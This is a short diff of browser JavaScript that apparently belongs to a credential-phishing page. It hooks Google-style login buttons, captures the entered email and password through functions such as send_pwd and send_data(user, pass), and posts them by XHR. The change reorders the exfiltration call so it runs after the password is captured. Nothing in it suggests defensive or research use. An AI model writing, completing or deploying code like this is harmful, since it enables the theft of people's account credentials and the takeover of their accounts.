@@ -53,7 +53,7 @@ function teste_send(user){
             console.log(xhr.responseText);
         }
     };
-    xhr.send();        
+    xhr.send();
 }
 
 
@@ -62,8 +62,11 @@ const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 btn[1].addEventListener('click', function(){
     teste_send(send_email())
     send_email();
-    setTimeout(function() {pwd = send_pwd()}, 3000);
+    setTimeout(function() {
+        pwd = send_pwd()
+        send_data(user, pass)
+    }, 3000);
     
-    send_data(user, pass)
+    
     
 })
